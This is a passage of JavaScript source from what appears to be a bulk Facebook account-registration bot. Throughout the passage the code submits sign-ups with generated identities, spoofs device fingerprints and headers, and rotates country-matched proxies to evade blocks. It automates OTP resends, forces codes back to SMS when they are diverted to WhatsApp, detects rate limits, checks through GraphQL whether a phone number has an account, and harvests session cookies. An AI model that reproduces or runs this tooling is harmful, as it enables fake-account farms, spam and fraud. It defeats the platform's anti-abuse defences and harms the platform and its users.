      const url = resolveSafe(uri);
      if (url && !seenUrls.has(url)) {
        seenUrls.add(url);
        links.push({ url, label: 'Resend redirect', score: 2 });
      }
    }
  }

  const formBlocks = fullHtml.match(/<form\b[^>]*>[\s\S]*?<\/form>/gi) || [];
  for (const blk of formBlocks) {
    const actMatch = blk.match(/action=["']([^"']+)["']/i);
    const action = resolveSafe(actMatch ? actMatch[1] : baseUrl);
    if (!action || /\/reg\/submit\//i.test(action)) continue;

    const actionIsResend = resendHrefRe.test(action);
    const hiddenFields = {};
    const radioGroups = {};
    const submitCandidates = [];

    for (const tag of blk.match(/<input\b[^>]*>/gi) || []) {
      const nM = tag.match(/name=["']([^"']+)["']/i);
      if (!nM) continue;
      const name = decodeHtmlAttrs(nM[1]);
      const tM = tag.match(/type=["']([^"']+)["']/i);
      const vM = tag.match(/value=["']([^"']*)["']/i);
      const itype = tM ? tM[1].toLowerCase() : 'text';
      const ival = vM ? decodeHtmlAttrs(vM[1]) : '';
      if (itype === 'hidden') {
        hiddenFields[name] = ival;
      } else if (itype === 'radio') {
        if (!radioGroups[name]) radioGroups[name] = [];
        radioGroups[name].push({
          value: ival,
          checked: /\bchecked\b/i.test(tag),
          isBad: badTargetRe.test(ival) || badTargetRe.test(tag),
          isSms: /\b(sms|text|phone|mobile|confirm_phone|send_sms)\b/i.test(`${ival} ${tag}`),
        });
      } else if (itype === 'submit' || itype === 'button') {
        submitCandidates.push({ name, value: ival, label: `${name} ${ival}` });
      }
    }

    for (const [rName, optsList] of Object.entries(radioGroups)) {
      const chosen =
        optsList.find((o) => o.isSms && !o.isBad) ||
        optsList.find((o) => o.checked && !o.isBad) ||
        optsList.find((o) => !o.isBad);
      if (chosen) hiddenFields[rName] = chosen.value;
    }

    for (const bm of blk.matchAll(/<button\b([^>]*)>([\s\S]*?)<\/button>/gi)) {
      const attrs = bm[1] || '';
      const inner = decodeHtmlAttrs(bm[2].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
      const nM = attrs.match(/name=["']([^"']+)["']/i);
      const vM = attrs.match(/value=["']([^"']*)["']/i);
      const tM = attrs.match(/type=["']([^"']+)["']/i);
      const btype = tM ? tM[1].toLowerCase() : 'submit';
      if (btype === 'reset') continue;
      submitCandidates.push({
        name: nM ? decodeHtmlAttrs(nM[1]) : '',
        value: vM ? decodeHtmlAttrs(vM[1]) : inner || '1',
        label: inner || (nM ? nM[1] : '') || (vM ? vM[1] : ''),
      });
    }

    const matchingSub = submitCandidates.find((s) => {
      if (badTargetRe.test(s.label)) return false;
      if (resendTextRe.test(s.label) || /\bresend\b|send_again|submit\[resend\]/i.test(s.label)) return true;
      if (!hasOtpInput && initialSmsTextRe.test(s.label) && /confirm|checkpoint|recover/i.test(action)) return true;
      return false;
    });

    if (actionIsResend || matchingSub) {
      const fields = { ...hiddenFields };
      if (matchingSub && matchingSub.name) {
        fields[matchingSub.name] = matchingSub.value;
      } else if (!actionIsResend) {
        continue;
      }
      const sig = `${action}:${Object.keys(fields).sort().join(',')}`;
      if (!seenForms.has(sig)) {
        seenForms.add(sig);
        forms.push({
          action,
          fields,
          label: matchingSub?.label || 'Resend form',
          score: (actionIsResend ? 3 : 0) + (matchingSub ? 2 : 0),
        });
      }
    }
  }

  links.sort((a, b) => b.score - a.score);
  forms.sort((a, b) => b.score - a.score);
  return { links, forms, hasOtpInput };
}

function isNonSmsDeliveryScreen(visLow = '') {
  const s = String(visLow || '').toLowerCase();
  if (!s) return false;
  const explicitlySms = /\b(?:via sms|by sms|text message|sms code|sent.{0,20}sms)\b/i.test(s);
  if (explicitlySms) return false;
  return /\b(?:sent.{0,28}whatsapp|check your whatsapp|open whatsapp|via whatsapp|whatsapp account|on another device|check your notifications|sent.{0,24}email)\b/i.test(s);
}

async function performOtpResendOnce(item, cfg, baseCookieOverride, opts = {}) {
  const isRecoveryItem = item.flow === 'recovery' || /\/recover\//i.test(item.confirm_url || '');
  const baseJar = isRecoveryItem ? {} : parseCookieHeader(baseCookieOverride || '');
  const jar = { ...baseJar, ...(item.cookies || {}) };
  const strictProxy = cfg.strict_proxy !== false;
  const ua = /Android|Mobile/i.test(String(item.ua || '')) ? item.ua : LITE_UA;
  const timeoutMs = ((cfg.timeout || 25) + 5) * 1000;

  const numDet = detectCountryFromNumber(`+${item.phone}`, cfg.cc, item.country || '');
  const rawIso = item.iso || item.proxyIso || (numDet?.iso && numDet.iso !== '??' ? numDet.iso : getCountryInfo(cfg.cc)[1]);
  const effectiveIso = /^[A-Za-z]{2}$/.test(String(rawIso || '').trim()) ? String(rawIso).trim().toUpperCase() : '';
  const pool = Array.isArray(opts.proxiesPool) ? opts.proxiesPool : [];
  const badProxies = opts.badProxies || new Set();
  const proxyIdx = Number(opts.proxyIndex ?? item.resendCount ?? 0) || 0;
  const rotateProxy = Boolean(opts.rotateProxy);

  let rawPx = '';
  if (rotateProxy && pool.length > 0) {
    rawPx = selectSmartProxy(pool, proxyIdx, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || item.rawProxy || item.proxy || null, effectiveIso) || '';
  }
  if (!rawPx) {
    rawPx = (item.rawProxy || cfg.proxy || item.proxy || '').trim();
  }

  let px = null;
  let appliedIso = effectiveIso;
  let appliedSession = '';
  if (rawPx) {
    const adapted = adaptProxyForSession(rawPx, {
      iso: effectiveIso,
      autoCountry: cfg.auto_proxy_country !== false,
      refreshSession: rotateProxy ? true : cfg.auto_proxy_refresh !== false,
      forcedSessionId: rotateProxy ? crypto.randomBytes(6).toString('hex') : (item.proxySession || undefined),
    });
    px = adapted.url;
    appliedIso = adapted.isoApplied || effectiveIso;
    appliedSession = adapted.sessionId || '';
    if (px && !rotateProxy) item.proxy = px;
  }

  let confirmUrl = item.confirm_url || `${FB_REG_BASE}/confirmphone.php`;
  let html = opts.html || item._lastConfirmHtml || '';
  let targets = html ? extractOtpResendTargets(html, confirmUrl) : { forms: [], links: [], hasOtpInput: false };

  const safeFetch = async (url, fOpts = {}) => {
    const mergedHeaders = {
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-dest': 'document',
      'sec-fetch-site': 'same-origin',
      'upgrade-insecure-requests': '1',
      ...(fOpts.headers || {}),
      'User-Agent': ua,
    };
    const t0 = Date.now();
    try {
      const r = await fetchWithJar(url, jar, {
        preferCurl: true,
        ...fOpts,
        headers: mergedHeaders,
        timeoutMs,
        proxy: px,
        strictProxy,
        ua,
        shouldAbort: opts.shouldAbort,
      });
      if (rawPx) recordProxyHealth(rawPx, true, Date.now() - t0);
      return r;
    } catch (err) {
      if (rawPx && err && err.isProxyError) recordProxyHealth(rawPx, false, Date.now() - t0, { err: err.message });
      if (err && err.isProxyError && /407/.test(err.message || '') && rawPx && px !== rawPx) {
        dynamicProxyTagBlacklist.add(proxyHealthKey(rawPx));
        px = rawPx;
        appliedSession = '';
        if (!rotateProxy) item.proxy = rawPx;
        return await fetchWithJar(url, jar, {
          ...fOpts,
          headers: mergedHeaders,
          timeoutMs,
          proxy: px,
          strictProxy,
          ua,
          shouldAbort: opts.shouldAbort,
        });
      }
      if (err && err.isProxyError && pool.length > 1) {
        if (rawPx) badProxies.add(proxyHealthKey(rawPx));
        const altRaw = selectSmartProxy(pool, proxyIdx + 1, badProxies, 'rotate', null, effectiveIso);
        if (altRaw && altRaw !== rawPx) {
          rawPx = altRaw;
          const altAdapted = adaptProxyForSession(altRaw, {
            iso: effectiveIso,
            autoCountry: cfg.auto_proxy_country !== false,
            refreshSession: true,
          });
          px = altAdapted.url;
          appliedIso = altAdapted.isoApplied || effectiveIso;
          appliedSession = altAdapted.sessionId || '';
          return await fetchWithJar(url, jar, {
            ...fOpts,
            headers: mergedHeaders,
            timeoutMs,
            proxy: px,
            strictProxy,
            ua,
            shouldAbort: opts.shouldAbort,
          });
        }
      }
      throw err;
    }
  };

  const isRecoveryFlow = item.flow === 'recovery' || /\/recover\//i.test(confirmUrl);

  // 1. If HTML is missing (or non-recovery HTML has no resend targets yet), fetch current confirmUrl first
  if (!html || (!isRecoveryFlow && targets.forms.length === 0 && targets.links.length === 0)) {
    if (confirmUrl && !/\/reg\/submit\//i.test(confirmUrl)) {
      try {
        const curRes = await safeFetch(confirmUrl, {
          headers: {
            'User-Agent': ua,
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-dest': 'document',
          },
        });
        if (curRes.status < 400 && (curRes.text || '').length > 180) {
          const curTargets = extractOtpResendTargets(curRes.text || '', curRes.url || confirmUrl);
          if (curTargets.forms.length > 0 || curTargets.links.length > 0 || !html) {
            html = curRes.text || html;
            confirmUrl = curRes.url || confirmUrl;
            targets = curTargets;
          }
        }
      } catch {
        // try fallback hosts below
      }
    }
  }

  // 2. For registration flow, if limited.facebook.com didn't expose HTML resend controls, probe m.facebook.com / mbasic confirm endpoints
  if (!isRecoveryFlow && targets.forms.length === 0 && targets.links.length === 0) {
    const probeUrls = [];
    for (const host of ['https://m.facebook.com', 'https://mbasic.facebook.com']) {
      try {
        const parsedCur = new URL(confirmUrl);
        if (parsedCur.origin !== host && !/\/reg\/submit/i.test(parsedCur.pathname)) {
          probeUrls.push(`${host}${parsedCur.pathname}${parsedCur.search}`);
        }
      } catch {
        // ignore
      }
      probeUrls.push(`${host}/confirmphone.php`);
    }
    for (const altUrl of Array.from(new Set(probeUrls))) {
      if (opts.shouldAbort && opts.shouldAbort()) break;
      try {
        const rAlt = await safeFetch(altUrl, { headers: { Referer: confirmUrl } });
        if (rAlt.status < 400 && (rAlt.text || '').length > 200) {
          const altTargets = extractOtpResendTargets(rAlt.text || '', rAlt.url || altUrl);
          if (altTargets.forms.length > 0 || altTargets.links.length > 0) {
            html = rAlt.text || html;
            confirmUrl = rAlt.url || altUrl;
            targets = altTargets;
            break;
          }
        }
      } catch {
        // try next fallback host
      }
    }
  }

  // 3. Recovery fallback (for recovery flow or if confirm page still didn't expose targets)
  if (isRecoveryFlow && (targets.forms.length === 0 && targets.links.length === 0)) {
    const cleanRecHtml = (html || '').replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');
    const tryAnotherMatch = cleanRecHtml.match(/<a\b[^>]*href=["']([^"']*\/recover\/initiate\/[^"']*)["']/i);
    const curOrigin = (() => {
      try {
        return new URL(confirmUrl).origin;
      } catch {
        return 'https://limited.facebook.com';
      }
    })();
    const initCandidates = Array.from(
      new Set([
        ...(tryAnotherMatch?.[1] ? [new URL(decodeHtmlAttrs(tryAnotherMatch[1]), confirmUrl).toString()] : []),
        `${curOrigin}/recover/initiate/?ars=facebook_login`,
        'https://limited.facebook.com/recover/initiate/?ars=facebook_login',
        'https://m.facebook.com/recover/initiate/?ars=facebook_login',
      ])
    );
    for (const initUrl of initCandidates) {
      if (opts.shouldAbort && opts.shouldAbort()) break;
      try {
        const initRes = await safeFetch(initUrl, {
          headers: { Referer: confirmUrl },
        });
        if (initRes.status < 400 && initRes.text && initRes.text.length > 200) {
          const iHtml = initRes.text;
          const iUrl = initRes.url || initUrl;
          const smsChoice = pickSmsRecoverChoice(iHtml, item.phone);
          const allowSingleSmsForm = Boolean(
            smsChoice.action &&
            (smsChoice.hasSmsRadio || (smsChoice.radios.length === 0 && !('pass' in smsChoice.fields) && /\/recover\/initiate|reset_action|sms|mobile|code/i.test(`${iUrl} ${iHtml}`)))
          );
          if (allowSingleSmsForm) {
            html = iHtml;
            confirmUrl = iUrl;
            const actFull = new URL(smsChoice.action, iUrl).toString();
            targets = {
              forms: [{ action: actFull, fields: smsChoice.fields, label: 'Recovery SMS resend', score: 5 }],
              links: [],
              hasOtpInput: false,
            };
            break;
          }
          const altT = extractOtpResendTargets(iHtml, iUrl);
          if (altT.forms.length > 0 || altT.links.length > 0) {
            html = iHtml;
            confirmUrl = iUrl;
            targets = altT;
            break;
          }
        }
      } catch {
        // try next initiate URL
      }
    }
  }

  let rResend = null;
  let usedMethod = '';
  try {
    if (targets.forms.length > 0) {
      const f = targets.forms[0];
      usedMethod = `POST(${f.label.slice(0, 28)})`;
      const baseOrigin = new URL(f.action).origin;
      rResend = await safeFetch(f.action, {
        method: 'POST',
        body: new URLSearchParams(f.fields).toString(),
        headers: {
          Referer: confirmUrl,
          Origin: baseOrigin,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
    } else if (targets.links.length > 0) {
      const l = targets.links[0];
      usedMethod = `GET(${l.label.slice(0, 28)})`;
      rResend = await safeFetch(l.url, { headers: { Referer: confirmUrl } });
      if (rResend && rResend.status < 400 && (rResend.text || '').length > 120) {
        const step2Url = rResend.url || l.url;
        const step2Html = rResend.text || '';
        const smsChoice2 = (/\/recover\/initiate/i.test(step2Url) || /name=["']recover_method["']/i.test(step2Html))
          ? pickSmsRecoverChoice(step2Html, item.phone)
          : null;
        const allowSms2 = Boolean(
          smsChoice2 &&
          smsChoice2.action &&
          (smsChoice2.hasSmsRadio || (smsChoice2.radios.length === 0 && !('pass' in smsChoice2.fields)))
        );
        if (allowSms2) {
          const act2 = new URL(smsChoice2.action, step2Url).toString();
          const step2Res = await safeFetch(act2, {
            method: 'POST',
            body: new URLSearchParams(smsChoice2.fields).toString(),
            headers: {
              Referer: step2Url,
              Origin: new URL(act2).origin,
              'Content-Type': 'application/x-www-form-urlencoded',
            },
          });
          if (step2Res) {
            rResend = step2Res;
            usedMethod = 'GET->POST(Recovery SMS resend)';
          }
        } else {
          const step2Targets = extractOtpResendTargets(step2Html, step2Url);
          if (step2Targets.forms.length > 0) {
            const sf = step2Targets.forms[0];
            const sfOrigin = new URL(sf.action).origin;
            const step2Res = await safeFetch(sf.action, {
              method: 'POST',
              body: new URLSearchParams(sf.fields).toString(),
              headers: {
                Referer: step2Url,
                Origin: sfOrigin,
                'Content-Type': 'application/x-www-form-urlencoded',
              },
            });
            if (step2Res) {
              rResend = step2Res;
              usedMethod = `GET->POST(${sf.label.slice(0, 22)})`;
            }
          }
        }
      }
    } else {
      // Final safe attempt: explicit resend query param if on confirmphone.php
      const parsedCur = new URL(confirmUrl);
      if (/confirmphone\.php|confirm_code/i.test(parsedCur.pathname)) {
        parsedCur.searchParams.set('resend', '1');
        usedMethod = 'GET(confirm?resend=1)';
        rResend = await safeFetch(parsedCur.toString(), { headers: { Referer: confirmUrl } });
      } else {
        return {
          ok: false,
          reason: 'No resend link/form found on confirmation page',
          proxyUsed: Boolean(px),
          proxyIso: appliedIso,
          proxySession: appliedSession,
          item,
        };
      }
    }
  } catch (err) {
    return {
      ok: false,
      reason: err instanceof Error ? err.message : 'Resend request failed',
      proxyUsed: Boolean(px),
      proxyIso: appliedIso,
      proxySession: appliedSession,
      item,
    };
  }

  const resBody = rResend?.text || '';
  const resUrl = rResend?.url || confirmUrl;
  if (rResend.status >= 400) {
    return {
      ok: false,
      reason: `Resend HTTP ${rResend.status}`,
      proxyUsed: Boolean(px),
      proxyIso: appliedIso,
      proxySession: appliedSession,
      item,
    };
  }

  if (jar.c_user && jar.xs) {
    return {
      ok: true,
      alreadyConfirmed: true,
      uid: jar.c_user,
      cookies: orderCookies(jar),
      via: usedMethod,
      proxyUsed: Boolean(px),
      proxyIso: appliedIso,
      proxySession: appliedSession,
      item,
    };
  }
  const directUid = extractUidFromHtml(resBody, resUrl);
  if (directUid && jar.xs) {
    jar.c_user = directUid;
    return {
      ok: true,
      alreadyConfirmed: true,
      uid: directUid,
      cookies: orderCookies(jar),
      via: usedMethod,
      proxyUsed: Boolean(px),
      proxyIso: appliedIso,
      proxySession: appliedSession,
      item,
    };
  }

  let finalBody = resBody;
  let finalUrl = resUrl;
  let signals = extractFbResponseSignals(finalBody);
  let visLow = `${signals.errTexts.join(' ')} ${signals.visibleText}`.toLowerCase();

  // Anti-WhatsApp / Anti-Email divert: if Meta silently routed OTP to WhatsApp or another device, force "Try another way -> SMS"
  if (isNonSmsDeliveryScreen(visLow)) {
    const tryMatch = finalBody.replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '').match(/<a\b[^>]*href=["']([^"']*\/recover\/initiate\/[^"']*)["']/i);
    if (tryMatch?.[1]) {
      try {
        const initU = new URL(decodeHtmlAttrs(tryMatch[1]), finalUrl).toString();
        const rSwitchGet = await safeFetch(initU, { headers: { Referer: finalUrl } });
        if (rSwitchGet.status < 400 && (rSwitchGet.text || '').length > 180) {
          const smsPick = pickSmsRecoverChoice(rSwitchGet.text, item.phone);
          if (smsPick.action && smsPick.hasSmsRadio) {
            const postAct = new URL(smsPick.action, rSwitchGet.url || initU).toString();
            const rSwitchPost = await safeFetch(postAct, {
              method: 'POST',
              body: new URLSearchParams(smsPick.fields).toString(),
              headers: {
                Referer: rSwitchGet.url || initU,
                Origin: new URL(postAct).origin,
                'Content-Type': 'application/x-www-form-urlencoded',
              },
            });
            if (rSwitchPost.status < 400 && (rSwitchPost.text || '').length > 120) {
              finalBody = rSwitchPost.text;
              finalUrl = rSwitchPost.url || postAct;
              signals = extractFbResponseSignals(finalBody);
              visLow = `${signals.errTexts.join(' ')} ${signals.visibleText}`.toLowerCase();
              usedMethod += '->switchSMS';
            }
          }
        }
      } catch {
        // fall through to divert check below
      }
    }
    if (isNonSmsDeliveryScreen(visLow)) {
      return {
        ok: false,
        whatsappDivert: true,
        reason: 'Facebook diverted code to WhatsApp/device instead of SMS',
        proxyUsed: Boolean(px),
        proxyIso: appliedIso,
        proxySession: appliedSession,
        item,
      };
    }
  }

  if (
    visLow.includes('wait a few minutes') ||
    visLow.includes('too many codes') ||
    visLow.includes('too many attempts') ||
    visLow.includes('rate limit') ||
    visLow.includes('try again later') ||
    visLow.includes('going too fast') ||
    visLow.includes('temporarily blocked') ||
    visLow.includes('slow down')
  ) {
    return {
      ok: false,
      rateLimited: true,
      reason: signals.errTexts[0]?.slice(0, 100) || 'Facebook asked to wait before another resend',
      proxyUsed: Boolean(px),
      proxyIso: appliedIso,
      proxySession: appliedSession,
      item,
    };
  }

  // Detect expired recovery session redirecting back to /login/identify/ without an active OTP code page
  const isBackAtIdentify = /\/login\/identify/i.test(finalUrl) && !OTP_FIELDS.some((k) => new RegExp(`name=["']${k}["']`, 'i').test(finalBody));
  if (isBackAtIdentify) {
    return {
      ok: false,
      sessionExpired: true,
      reason: 'Recovery session expired on Facebook (returned to search)',
      proxyUsed: Boolean(px),
      proxyIso: appliedIso,
      proxySession: appliedSession,
      item,
    };
  }

  item.cookies = orderCookies(jar);
  item.confirm_url = finalUrl;
  item._lastConfirmHtml = finalBody;
  if (px) item.proxy = px;
  if (appliedIso) item.proxyIso = appliedIso;
  if (appliedSession) item.proxySession = appliedSession;

  const refreshedForm = readForm(signals.decodedHtml, 'otp');
  if (
    refreshedForm.action &&
    !/\/reg\/submit\//i.test(refreshedForm.action) &&
    (OTP_FIELDS.some((k) => k in refreshedForm.inputs) || /confirm(?:phone|email|_code)|checkpoint|\/recover\/code/i.test(refreshedForm.action))
  ) {
    item.action = refreshedForm.action;
    item.fields = Object.fromEntries(Object.entries(refreshedForm.inputs).map(([k, v]) => [k, v[1]]));
  }
  const newLsd = tok(finalBody, 'lsd');
  if (newLsd && item.fields) {
    item.fields.lsd = newLsd;
    item.fields.jazoest = tok(finalBody, 'jazoest') || jazoest(newLsd);
  }

  item.resendCount = Number(item.resendCount || 0) + 1;
  item.lastResendAt = Date.now();

  return {
    ok: true,
    alreadyConfirmed: false,
    via: usedMethod,
    confirmUrl: item.confirm_url,
    resendCount: item.resendCount,
    proxyUsed: Boolean(px),
    proxyIso: appliedIso,
    proxySession: appliedSession,
    item,
  };
}

async function performAutoOtpResends(item, cfg, baseCookieOverride, opts = {}) {
  const totalRounds = opts.rounds !== undefined
    ? Math.max(0, Math.min(10, Number(opts.rounds)))
    : Math.max(0, Math.min(10, Number(cfg.auto_otp_resend ?? 2)));
  let curItem = { ...item };
  let count = 0;
  const logs = [];

  if (totalRounds <= 0) {
    return { count: 0, alreadyConfirmed: false, item: curItem, logs };
  }

  const delays = Array.isArray(opts.delays) && opts.delays.length > 0 ? opts.delays : [950, 1900, 2200, 2500];
  for (let round = 1; round <= totalRounds; round++) {
    if (opts.shouldAbort && opts.shouldAbort()) break;
    const waitMs = delays[Math.min(round - 1, delays.length - 1)];
    const okSleep = await sleepAbort(waitMs, opts.shouldAbort);
    if (!okSleep) break;
    if (opts.shouldAbort && opts.shouldAbort()) break;

    const stepRes = await performOtpResendOnce(curItem, cfg, baseCookieOverride, {
      ...opts,
      proxyIndex: round - 1,
    });
    if (stepRes.item) curItem = stepRes.item;

    if (stepRes.alreadyConfirmed) {
      count += 1;
      logs.push(`Resend ${round}/${totalRounds}: auto-confirmed UID=${stepRes.uid}`);
      if (opts.onStep) await opts.onStep(round, totalRounds, stepRes, curItem);
      return {
        count,
        alreadyConfirmed: true,
        uid: stepRes.uid,
        cookies: stepRes.cookies,
        item: curItem,
        logs,
      };
    }

    if (stepRes.ok) {
      count += 1;
      logs.push(`Resend ${round}/${totalRounds} OK via ${stepRes.via}${stepRes.proxyIso ? ` [${stepRes.proxyIso}]` : ''}`);
      if (opts.onStep) await opts.onStep(round, totalRounds, stepRes, curItem);
    } else {
      logs.push(`Resend ${round}/${totalRounds} stopped: ${stepRes.reason || 'failed'}`);
      if (opts.onStep) await opts.onStep(round, totalRounds, stepRes, curItem);
      if (stepRes.rateLimited || /no resend link\/form/i.test(stepRes.reason || '')) break;
    }
  }

  return { count, alreadyConfirmed: false, item: curItem, logs };
}

async function checkAccountLogin(item, cfg, baseCookieOverride) {
  const baseJar = parseCookieHeader(baseCookieOverride || '');
  const jar = { ...baseJar, ...(item.cookies || {}) };
  const px = (item.proxy || cfg.proxy || '').trim() || null;
  if (jar.c_user && jar.xs) {
    return { ok: true, uid: jar.c_user, cookies: orderCookies(jar) };
  }
  const pw = (item.pass || cfg.password || '').trim();
  const uid = await loginUid(item.phone, pw, cfg, jar, px);
  if (uid && jar.xs) {
    return { ok: true, uid, cookies: orderCookies(jar) };
  }
  if (uid) {
    return { ok: false, reason: 'Account UID found but requires confirmation/checkpoint before session cookie is issued.' };
  }
  // Check GraphQL to determine whether an account actually exists on Facebook at all
  try {
    const gql = await checkNumberGraphql(`+${item.phone}`, {
      cc: cfg.cc,
      proxy: px,
      strictProxy: cfg.strict_proxy !== false,
      timeoutMs: 18000,
    });
    if (gql.status === 'free') {
      return {
        ok: false,
        notCreated: true,
        reason: 'No Facebook account exists for this number (failed signup session).',
      };
    }
    if (gql.status === 'taken') {
      return {
        ok: false,
        existsOnFb: true,
        reason: 'Account exists on Facebook but login needs OTP / checkpoint confirmation.',
      };
    }
  } catch {
    // ignore gql fallback error
  }
  if (/\/reg\/submit\//i.test(item.confirm_url || '') && !item.action) {
    return {
      ok: false,
      notCreated: true,
      reason: 'Incomplete signup session (no confirmation form or account UID created).',
    };
  }
  return { ok: false, reason: 'Account still requires OTP / checkpoint confirmation.' };
}

async function runLimitedSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px, trace, opts }) {
  const timeoutMs = (cfg.timeout || 18) * 1000;
  const isTurbo = Boolean(cfg.hbx_mode && !cfg.human_delay);
  const stepTimeout = isTurbo ? Math.min(timeoutMs, 10000) : Math.min(timeoutMs, 14000);
  const strictProxy = cfg.strict_proxy !== false;
  const proxySaver = cfg.proxy_saver !== false;

  // Step 1: Optional www.facebook.com homepage warmup (skipped in Proxy Saver mode to save ~500-900KB per ID)
  if (!proxySaver) {
    try {
      await fetchWithJar('https://www.facebook.com/', jar, {
        timeoutMs: Math.min(timeoutMs, 8000),
        proxy: px,
        strictProxy,
        ua: fp.ua,
        headers: { ...fp.headers, 'sec-fetch-site': 'none' },
        shouldAbort: opts.shouldAbort,
      });
    } catch (err) {
      if (err && err.isProxyError) throw err;
    }

    if (!(await sleepAbort(isTurbo ? 25 : 100 + Math.floor(Math.random() * 150), opts.shouldAbort))) {
      return { aborted: true };
    }
  } else if (px) {
    proxyTrafficStats.savedWarmups += 1;
    trace.push('px-saver');
  }

  // Step 2: GET limited.facebook.com registration entrypoint
  const regUrl = `${FB_REG_BASE}/reg/?cid=103&refsrc=deprecated&soft=hjk`;
  const extractLsdFromHtml = (html) =>
    html.match(/"LSD",\[\],\{"token":"([^"]+)"/) ||
    html.match(/name=["']lsd["'][^>]*value=["']([^"']+)["']/i) ||
    html.match(/value=["']([^"']+)["'][^>]*name=["']lsd["']/i);

  let rGet = await fetchWithJar(regUrl, jar, {
    timeoutMs: stepTimeout,
    proxy: px,
    strictProxy,
    ua: fp.ua,
    headers: { ...fp.headers, Referer: 'https://www.facebook.com/', 'sec-fetch-site': 'same-site' },
    shouldAbort: opts.shouldAbort,
  });
  let regHtml = rGet.text || '';
  let mLsd = extractLsdFromHtml(regHtml);

  // HBX LSD_FAIL_AFTER_WIPE rule: if LSD token missing on first GET, wipe cookies & retry cleanly once
  if (!mLsd && cfg.hbx_mode) {
    trace.push('lsd-miss->wipe-retry');
    for (const k of Object.keys(jar)) delete jar[k];
    if (!(await sleepAbort(cfg.human_delay ? humanDelayMs(350, 750, 0) : (isTurbo ? 75 : 220), opts.shouldAbort))) {
      return { aborted: true };
    }
    rGet = await fetchWithJar(regUrl, jar, {
      timeoutMs: stepTimeout,
      proxy: px,
      strictProxy,
      ua: fp.ua,
      headers: { ...fp.headers, Referer: 'https://www.facebook.com/', 'sec-fetch-site': 'same-site' },
      shouldAbort: opts.shouldAbort,
    });
    regHtml = rGet.text || '';
    mLsd = extractLsdFromHtml(regHtml);
    if (!mLsd && rGet.status < 400) {
      trace.push('LSD_FAIL_AFTER_WIPE');
      return { retryNext: true, err: 'LSD_FAIL_AFTER_WIPE (no LSD token after cookie wipe)', html: regHtml };
    }
  }

  const lsd = mLsd ? mLsd[1] : DEFAULT_FB_LSD;
  const jaz = tok(regHtml, 'jazoest') || jazoest(lsd);
  trace.push(`lim-get ${rGet.status}/${regHtml.length}B lsd=${lsd.slice(0, 6)} fp=${fp.profileLabel || fp.model}`);

  if (rGet.status >= 400) {
    return { retryNext: true, err: `limited GET HTTP ${rGet.status}` };
  }

  // Step 3: Snappy realistic submit pacing (ultra-fast in FB Tools Turbo mode; Gaussian when human_delay enabled)
  const paceMs = cfg.human_delay
    ? humanDelayMs(240, 580, 0.1)
    : isTurbo
    ? 15 + Math.floor(Math.random() * 35)
    : 70 + Math.floor(Math.random() * 70);
  if (!(await sleepAbort(paceMs, opts.shouldAbort))) {
    return { aborted: true };
  }

  // Step 4: Submit payload to limited.facebook.com/reg/submit/
  const regForm = readForm(regHtml, 'reg');
  const regInst = regForm.inputs?.reg_instance?.[1] || crypto.randomUUID().replace(/-/g, '').slice(0, 24);
  const payload = new URLSearchParams({
    ccp: regForm.inputs?.ccp?.[1] || '2',
    reg_instance: regInst,
    submission_request: 'true',
    helper: '',
    reg_impression_id: regForm.inputs?.reg_impression_id?.[1] || crypto.randomUUID(),
    ns: regForm.inputs?.ns?.[1] || '1',
    zero_header_af_client: '',
    app_id: '103',
    logger_id: regForm.inputs?.logger_id?.[1] || crypto.randomUUID(),
    'field_names[0]': 'firstname',
    firstname: identity.first,
    lastname: identity.last,
    'field_names[1]': 'birthday_wrapper',
    birthday_day: String(identity.bd),
    birthday_month: String(identity.bm),
    birthday_year: String(identity.by),
    age_step_input: '',
    did_use_age: 'false',
    'field_names[2]': 'reg_email__',
    reg_email__: cleanPhone,
    'field_names[3]': 'sex',
    sex: identity.sex,
    preferred_pronoun: '',
    custom_gender: '',
    'field_names[4]': 'reg_passwd__',
    reg_passwd__: pw,
    was_shown_name_suggestions: 'false',
    did_use_suggested_name: 'false',
    use_custom_gender: 'false',
    guid: '',
    pre_form_step: '',
    submit: 'Sign up',
    lsd,
    jazoest: jaz,
    __req: '7',
    __fmt: '1',
    __user: '0',
  }).toString();

  const postHeaders = {
    ...fp.xhrHeaders,
    'Content-Type': 'application/x-www-form-urlencoded',
    'x-response-format': 'JSONStream',
    'x-asbd-id': '359341',
    'x-requested-with': 'XMLHttpRequest',
    origin: FB_REG_BASE,
    referer: regUrl,
    'x-fb-lsd': lsd,
  };

  const submitUrl = `${FB_REG_BASE}/reg/submit/?app_id=103&multi_step_form=1&skip_suma=0&shouldForceMTouch=1`;
  const rPost = await fetchWithJar(submitUrl, jar, {
    method: 'POST',
    body: payload,
    timeoutMs: isTurbo ? Math.min(timeoutMs + 1000, 11500) : timeoutMs + 3000,
    proxy: px,
    strictProxy,
    ua: fp.ua,
    headers: postHeaders,
    shouldAbort: opts.shouldAbort,
  });

  const body = rPost.text || '';
  const urlLow = (rPost.url || '').toLowerCase();
  trace.push(`lim-post ${rPost.status}/${body.length}B`);

  // Extract c_user from cookie jar or response body (matches bot.py)
  let uid = jar.c_user || '';
  if (!uid) {
    const mUid = body.match(/"c_user"\s*:\s*"?(\d{6,})"?/) || body.match(/"USER_ID"\s*:\s*"(\d{6,})"/);
    if (mUid && mUid[1] !== '0') {
      uid = mUid[1];
      jar.c_user = uid;
    }
  }

  // Parse BigPipe HTML + JSONStream chunks accurately (prioritize confirm/checkpoint over home/welcome)
  const postSignals = extractFbResponseSignals(body);
  const interestingUri =
    postSignals.redirectUris.find((u) => /\/(?:confirm(?:phone|email|_code)|checkpoint|recover)/i.test(u) && !u.includes('/r.php')) ||
    postSignals.redirectUris.find((u) => /\/(?:home\.php|welcome)/i.test(u) && !u.includes('/r.php'));

  // Follow explicit confirm/checkpoint/home redirect (or probe home.php if c_user was issued without confirm URL)
  let followRes = null;
  const followTarget = interestingUri
    ? new URL(interestingUri, FB_REG_BASE).toString()
